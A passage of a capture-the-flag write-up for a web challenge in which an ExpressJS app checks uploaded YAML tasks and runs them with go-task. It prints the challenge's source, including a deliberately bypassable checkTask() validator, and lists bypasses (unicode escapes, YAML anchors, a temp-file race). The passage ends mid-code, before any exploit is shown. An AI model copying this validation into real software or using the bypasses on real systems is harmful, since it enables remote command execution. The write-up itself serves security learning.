href=#unicode-escape-sequences-by-alemmi-sebstr-pysu>Unicode escape sequences (by @Alemmi, @sebstr, @pysu)</a></li><li><a href=#yamls-anchors-and-aliases-my-solution>YAML&rsquo;s Anchors and Aliases (my solution)</a></li></ul></li><li><a href=#intended-solution-toctou-race-condition-in-checktask-by-leveraging-express-fileupload-tempfiles>Intended Solution: TOCTOU race condition in <code>checkTask()</code> by leveraging <code>express-fileupload</code> tempFiles</a></li></ul></nav></div></details><script>(function(){"use strict";const s=.33,o="#TableOfContents",i=".anchor",a='a[href^="#"]',r="li ul",c="active";let t=!1;function l(e,n){const o=window.scrollY+window.innerHeight*n,i=[...document.querySelectorAll('#TableOfContents a[href^="#"]')],s=new Set(i.map(e=>e.getAttribute("href").substring(1)));if(t)for(let t=0;t<e.length;t++){const n=e[t];if(!s.has(n.id))continue;const o=n.getBoundingClientRect().top+window.scrollY;if(Math.abs(window.scrollY-o)<100)return n.id}for(let t=e.length-1;t>=0;t--){const n=e[t].getBoundingClientRect().top+window.scrollY;if(n<=o&&s.has(e[t].id))return e[t].id}return e.find(e=>s.has(e.id))?.id||""}function e({toc:e,anchors:t,links:n,scrollOffset:s,collapseInactive:o}){const i=l(t,s);if(!i)return;if(n.forEach(e=>{const t=e.getAttribute("href")===`#${i}`;if(e.classList.toggle(c,t),o){const n=e.closest("li")?.querySelector("ul");n&&(n.style.display=t?"":"none")}}),o){const n=e.querySelector(`a[href="#${CSS.escape(i)}"]`);let t=n;for(;t&&t!==e;)t.tagName==="UL"&&(t.style.display=""),t.tagName==="LI"&&t.querySelector("ul")?.style.setProperty("display",""),t=t.parentElement}}function n(){const n=document.querySelector(o);if(!n)return;const l=!1,u=[...document.querySelectorAll(i)],d=[...n.querySelectorAll(a)];l&&n.querySelectorAll(r).forEach(e=>e.style.display="none"),d.forEach(e=>{e.addEventListener("click",()=>{t=!0})});const c={toc:n,anchors:u,links:d,scrollOffset:s,collapseInactive:l};window.addEventListener("scroll",()=>e(c),{passive:!0}),window.addEventListener("hashchange",()=>e(c),{passive:!0}),e(c)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",n):n()})()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><h2 class="relative group">Description<div id=description class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#description aria-label=Anchor>#</a></span></h2><blockquote><p>Automate your workflow by creating, editing, and running YAML tasks right in your browser.
Use the smart editor, execute tasks securely, and share or reuse templates from the community!</p></blockquote><h2 class="relative group">Challenge scenario<div id=challenge-scenario class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#challenge-scenario aria-label=Anchor>#</a></span></h2><p>The challenge is an ExpressJS webapp that parses YAML files and executes the tasks defined in them using <a href=https://github.com/go-task/task target=_blank rel=noreferrer>go-task</a> binary. The goal is to achieve RCE and execute the <code>/readflag</code> setuid binary to get the flag.</p><p>The following are the relevant files in the challenge:</p><p><strong>server.mjs</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>import</span> <span class=nx>express</span> <span class=nx>from</span> <span class=s1>&#39;express&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=nx>fileUpload</span> <span class=nx>from</span> <span class=s1>&#39;express-fileupload&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=nx>fs</span> <span class=nx>from</span> <span class=s1>&#39;fs/promises&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=nx>sqlite3</span> <span class=nx>from</span> <span class=s1>&#39;sqlite3&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>open</span> <span class=p>}</span> <span class=nx>from</span> <span class=s1>&#39;sqlite&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=nx>cookieParser</span> <span class=nx>from</span> <span class=s1>&#39;cookie-parser&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=nx>path</span> <span class=nx>from</span> <span class=s1>&#39;path&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=nx>createApiRouter</span> <span class=nx>from</span> <span class=s1>&#39;./apiRouter.mjs&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>app</span> <span class=o>=</span> <span class=nx>express</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>PORT</span> <span class=o>=</span> <span class=mi>3000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>let</span> <span class=nx>templates</span> <span class=o>=</span> <span class=nx>JSON</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=kr>await</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>readFile</span><span class=p>(</span><span class=s1>&#39;templates.json&#39;</span><span class=p>,</span> <span class=s1>&#39;utf-8&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>templates</span> <span class=o>=</span> <span class=nx>templates</span><span class=p>.</span><span class=nx>map</span><span class=p>(</span><span class=nx>t</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>t</span><span class=p>.</span><span class=nx>cmdregex</span> <span class=o>=</span> <span class=k>new</span> <span class=nb>RegExp</span><span class=p>(</span><span class=nx>t</span><span class=p>.</span><span class=nx>cmdregex</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>t</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>uploadsDir</span> <span class=o>=</span> <span class=nx>path</span><span class=p>.</span><span class=nx>resolve</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>dirname</span><span class=p>(</span><span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=kr>import</span><span class=p>.</span><span class=nx>meta</span><span class=p>.</span><span class=nx>url</span><span class=p>).</span><span class=nx>pathname</span><span class=p>),</span> <span class=s1>&#39;uploads&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>fs</span><span class=p>.</span><span class=nx>mkdir</span><span class=p>(</span><span class=nx>uploadsDir</span><span class=p>,</span> <span class=p>{</span> <span class=nx>recursive</span><span class=o>:</span> <span class=kc>true</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>express</span><span class=p>.</span><span class=nx>urlencoded</span><span class=p>({</span> <span class=nx>extended</span><span class=o>:</span> <span class=kc>true</span> <span class=p>}));</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>express</span><span class=p>.</span><span class=nx>json</span><span class=p>());</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>fileUpload</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=nx>limits</span><span class=o>:</span> <span class=p>{</span> <span class=nx>fileSize</span><span class=o>:</span> <span class=mi>1</span> <span class=o>*</span> <span class=mi>1024</span> <span class=o>*</span> <span class=mi>1024</span> <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=nx>abortOnLimit</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>useTempFiles</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>tempFileDir</span><span class=o>:</span> <span class=s1>&#39;/tmp/&#39;</span>
</span></span><span class=line><span class=cl><span class=p>}));</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>cookieParser</span><span class=p>());</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>db</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>open</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=nx>filename</span><span class=o>:</span> <span class=s1>&#39;:memory:&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nx>driver</span><span class=o>:</span> <span class=nx>sqlite3</span><span class=p>.</span><span class=nx>Database</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Create a table if it doesn&#39;t exist
</span></span></span><span class=line><span class=cl><span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>exec</span><span class=p>(</span><span class=sb>`
</span></span></span><span class=line><span class=cl><span class=sb>    CREATE TABLE IF NOT EXISTS users (
</span></span></span><span class=line><span class=cl><span class=sb>        id VARCHAR(40) PRIMARY KEY,
</span></span></span><span class=line><span class=cl><span class=sb>        username VARCHAR(40) NOT NULL,
</span></span></span><span class=line><span class=cl><span class=sb>        password VARCHAR(40) NOT NULL
</span></span></span><span class=line><span class=cl><span class=sb>    );
</span></span></span><span class=line><span class=cl><span class=sb>    
</span></span></span><span class=line><span class=cl><span class=sb>    CREATE TABLE IF NOT EXISTS tasks (
</span></span></span><span class=line><span class=cl><span class=sb>        id VARCHAR(40) PRIMARY KEY,
</span></span></span><span class=line><span class=cl><span class=sb>        user VARCHAR(40) NOT NULL,
</span></span></span><span class=line><span class=cl><span class=sb>        template VARCHAR(40) NOT NULL,
</span></span></span><span class=line><span class=cl><span class=sb>        ts DATETIME DEFAULT CURRENT_TIMESTAMP,
</span></span></span><span class=line><span class=cl><span class=sb>        FOREIGN KEY (user) REFERENCES users(id)
</span></span></span><span class=line><span class=cl><span class=sb>    );
</span></span></span><span class=line><span class=cl><span class=sb>
</span></span></span><span class=line><span class=cl><span class=sb>    CREATE TABLE IF NOT EXISTS logs (
</span></span></span><span class=line><span class=cl><span class=sb>        id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span></span><span class=line><span class=cl><span class=sb>        task VARCHAR(40) NOT NULL,
</span></span></span><span class=line><span class=cl><span class=sb>        status VARCHAR(20) NOT NULL,
</span></span></span><span class=line><span class=cl><span class=sb>        output TEXT,
</span></span></span><span class=line><span class=cl><span class=sb>        ts DATETIME DEFAULT CURRENT_TIMESTAMP,
</span></span></span><span class=line><span class=cl><span class=sb>        FOREIGN KEY (task) REFERENCES tasks(id)
</span></span></span><span class=line><span class=cl><span class=sb>    );
</span></span></span><span class=line><span class=cl><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span> <span class=kr>async</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>userId</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>user_id</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>userId</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kr>const</span> <span class=nx>user</span> <span class=o>=</span> <span class=kr>await</span> <span class=nx>db</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;SELECT * FROM users WHERE id = ?&#39;</span><span class=p>,</span> <span class=p>[</span><span class=nx>userId</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nx>user</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>req</span><span class=p>.</span><span class=nx>user</span> <span class=o>=</span> <span class=nx>user</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>req</span><span class=p>.</span><span class=nx>user</span> <span class=o>=</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=nx>res</span><span class=p>.</span><span class=nx>clearCookie</span><span class=p>(</span><span class=s1>&#39;user_id&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>   
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>req</span><span class=p>.</span><span class=nx>user</span> <span class=o>=</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nx>next</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>// Mount API router
</span></span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=s1>&#39;/api&#39;</span><span class=p>,</span> <span class=nx>createApiRouter</span><span class=p>({</span> <span class=nx>db</span><span class=p>,</span> <span class=nx>templates</span><span class=p>,</span> <span class=nx>uploadsDir</span><span class=p>}));</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>buildPath</span> <span class=o>=</span> <span class=nx>path</span><span class=p>.</span><span class=nx>resolve</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>dirname</span><span class=p>(</span><span class=k>new</span> <span class=nx>URL</span><span class=p>(</span><span class=kr>import</span><span class=p>.</span><span class=nx>meta</span><span class=p>.</span><span class=nx>url</span><span class=p>).</span><span class=nx>pathname</span><span class=p>),</span> <span class=s1>&#39;../frontend&#39;</span><span class=p>,</span> <span class=s1>&#39;build&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>express</span><span class=p>.</span><span class=kr>static</span><span class=p>(</span><span class=nx>buildPath</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/{*any}&#39;</span><span class=p>,</span> <span class=p>(</span><span class=nx>_</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>res</span><span class=p>.</span><span class=nx>sendFile</span><span class=p>(</span><span class=nx>path</span><span class=p>.</span><span class=nx>join</span><span class=p>(</span><span class=nx>buildPath</span><span class=p>,</span> <span class=s1>&#39;index.html&#39;</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>listen</span><span class=p>(</span><span class=nx>PORT</span><span class=p>,</span> <span class=p>()</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=sb>`API server is running on http://localhost:</span><span class=si>${</span><span class=nx>PORT</span><span class=si>}</span><span class=sb>`</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>});</span></span></span></code></pre></div></div><p>This is the main ExpressJS server entrypoint and basically setups its options, inits the SQLite in-memory database, and mounts the API router. The app uses <code>express-fileupload</code> to handle file uploads with the following options:</p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>use</span><span class=p>(</span><span class=nx>fileUpload</span><span class=p>({</span>
</span></span><span class=line><span class=cl>    <span class=nx>limits</span><span class=o>:</span> <span class=p>{</span> <span class=nx>fileSize</span><span class=o>:</span> <span class=mi>1</span> <span class=o>*</span> <span class=mi>1024</span> <span class=o>*</span> <span class=mi>1024</span> <span class=p>},</span> <span class=c1>// 1MB limit
</span></span></span><span class=line><span class=cl>    <span class=nx>abortOnLimit</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span> <span class=c1>// Abort on file size limit
</span></span></span><span class=line><span class=cl>    <span class=nx>useTempFiles</span><span class=o>:</span> <span class=kc>true</span><span class=p>,</span> <span class=c1>// Use temporary files
</span></span></span><span class=line><span class=cl>    <span class=nx>tempFileDir</span><span class=o>:</span> <span class=s1>&#39;/tmp/&#39;</span> <span class=c1>// Temporary file directory
</span></span></span><span class=line><span class=cl><span class=p>}));</span></span></span></code></pre></div></div><p>Meaning that <code>express-fileupload</code> will store the chunk of files being uploaded under <code>/tmp</code> until the upload is complete, and then move them to the <code>uploadsDir</code> directory, which is set to <code>./uploads</code> relative to the server entrypoint. Keep this in mind, because it will be relevant later on.</p><p><strong>apiRouter.mjs</strong></p><div class=highlight-wrapper><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kr>import</span> <span class=nx>express</span> <span class=nx>from</span> <span class=s1>&#39;express&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>randomUUID</span> <span class=p>}</span> <span class=nx>from</span> <span class=s1>&#39;crypto&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=nx>fs</span> <span class=nx>from</span> <span class=s1>&#39;fs/promises&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=nx>yaml</span> <span class=nx>from</span> <span class=s1>&#39;yaml&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kr>import</span> <span class=p>{</span> <span class=nx>spawn</span> <span class=p>}</span> <span class=nx>from</span> <span class=s1>&#39;child_process&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>function</span> <span class=nx>checkTask</span><span class=p>(</span><span class=nx>templates</span><span class=p>,</span> <span class=nx>data</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=c1>// Check if the file is a valid YAML file
</span></span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>yamlData</span> <span class=o>=</span> <span class=nx>yaml</span><span class=p>.</span><span class=nx>parse</span><span class=p>(</span><span class=nx>data</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// check if the yamlData is valid
</span></span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;YAML data:&#39;</span><span class=p>,</span> <span class=nx>yamlData</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>yamlData</span> <span class=o>===</span> <span class=kc>null</span> <span class=o>||</span> <span class=k>typeof</span> <span class=nx>yamlData</span> <span class=o>!==</span> <span class=s1>&#39;object&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Invalid YAML data&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// get all keys
</span></span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>keys</span> <span class=o>=</span> <span class=nb>Object</span><span class=p>.</span><span class=nx>keys</span><span class=p>(</span><span class=nx>yamlData</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// keyys should be ONLY &#34;version&#34;, &#34;tasks&#34;
</span></span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>keys</span><span class=p>.</span><span class=nx>length</span> <span class=o>!==</span> <span class=mi>2</span> <span class=o>||</span> <span class=o>!</span><span class=nx>keys</span><span class=p>.</span><span class=nx>includes</span><span class=p>(</span><span class=s1>&#39;version&#39;</span><span class=p>)</span> <span class=o>||</span> <span class=o>!</span><span class=nx>keys</span><span class=p>.</span><span class=nx>includes</span><span class=p>(</span><span class=s1>&#39;tasks&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Invalid YAML data&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// check if the version is 3
</span></span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>yamlData</span><span class=p>.</span><span class=nx>version</span> <span class=o>!==</span> <span class=mi>3</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Invalid YAML version&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// check if the tasks is an object
</span></span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>yamlData</span><span class=p>.</span><span class=nx>tasks</span> <span class=o>!==</span> <span class=s1>&#39;object&#39;</span> <span class=o>||</span> <span class=nb>Array</span><span class=p>.</span><span class=nx>isArray</span><span class=p>(</span><span class=nx>yamlData</span><span class=p>.</span><span class=nx>tasks</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Invalid YAML tasks&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// check if the tasks has only one key
</span></span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>taskKeys</span> <span class=o>=</span> <span class=nb>Object</span><span class=p>.</span><span class=nx>keys</span><span class=p>(</span><span class=nx>yamlData</span><span class=p>.</span><span class=nx>tasks</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>taskKeys</span><span class=p>.</span><span class=nx>length</span> <span class=o>!==</span> <span class=mi>1</span> <span class=o>||</span> <span class=nx>taskKeys</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>!==</span> <span class=s1>&#39;task&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Invalid YAML tasks&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// check if the task is an object
</span></span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>yamlData</span><span class=p>.</span><span class=nx>tasks</span><span class=p>.</span><span class=nx>task</span> <span class=o>!==</span> <span class=s1>&#39;object&#39;</span> <span class=o>||</span> <span class=nb>Array</span><span class=p>.</span><span class=nx>isArray</span><span class=p>(</span><span class=nx>yamlData</span><span class=p>.</span><span class=nx>tasks</span><span class=p>.</span><span class=nx>task</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Invalid YAML task&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// check if the task has only one key
</span></span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>taskDataKeys</span> <span class=o>=</span> <span class=nb>Object</span><span class=p>.</span><span class=nx>keys</span><span class=p>(</span><span class=nx>yamlData</span><span class=p>.</span><span class=nx>tasks</span><span class=p>.</span><span class=nx>task</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>taskDataKeys</span><span class=p>.</span><span class=nx>length</span> <span class=o>!==</span> <span class=mi>1</span> <span class=o>||</span> <span class=nx>taskDataKeys</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>!==</span> <span class=s1>&#39;cmds&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Invalid YAML task data&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// check if the cmds is an array
</span></span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nb>Array</span><span class=p>.</span><span class=nx>isArray</span><span class=p>(</span><span class=nx>yamlData</span><span class=p>.</span><span class=nx>tasks</span><span class=p>.</span><span class=nx>task</span><span class=p>.</span><span class=nx>cmds</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Invalid YAML task cmds&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// check if the cmds has only one element
</span></span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>yamlData</span><span class=p>.</span><span class=nx>tasks</span><span class=p>.</span><span class=nx>task</span><span class=p>.</span><span class=nx>cmds</span><span class=p>.</span><span class=nx>length</span> <span class=o>!==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Invalid YAML task cmds&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// check if the cmds is a string
</span></span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=k>typeof</span> <span class=nx>yamlData</span><span class=p>.</span><span class=nx>tasks</span><span class=p>.</span><span class=nx>task</span><span class=p>.</span><span class=nx>cmds</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>!==</span> <span class=s1>&#39;string&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Invalid YAML task cmd&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=c1>// check if the cmd is a valid command
</span></span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>cmd</span> <span class=o>=</span> <span class=nx>yamlData</span><span class=p>.</span><span class=nx>tasks</span><span class=p>.</span><span class=nx>task</span><span class=p>.</span><span class=nx>cmds</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>console</span><span class=p>.</span><span class=nx>log</span><span class=p>(</span><span class=s1>&#39;Command:&#39;</span><span class=p>,</span> <span class=nx>cmd</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=c1>// check if it match at least one template regex
</span></span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>matchedTemplate</span> <span class=o>=</span> <span class=nx>templates</span><span class=p>.</span><span class=nx>find</span><span class=p>(</span><span class=nx>t</span> <span class=p>=&gt;</span> <span class=nx>t</span><span class=p>.</span><span class=nx>cmdregex</span><span class=p>.</span><span class=nx>test</span><span class=p>(</span><span class=nx>cmd</span><span class=p>));</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>matchedTemplate</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>throw</span> <span class=k>new</span> <span class=nb>Error</span><span class=p>(</span><span class=s1>&#39;Invalid YAML task cmd&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kr>export</span> <span class=k>default</span> <span class=kd>function</span> <span class=nx>createApiRouter</span><span class=p>({</span> <span class=nx>db</span><span class=p>,</span> <span class=nx>templates</span><span class=p>,</span> <span class=nx>uploadsDir</span> <span class=p>})</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>router</span> <span class=o>=</span> <span class=nx>express</span><span class=p>.</span><span class=nx>Router</span><span class=p>();</span>
</span></span><span class=line><span class=cl>
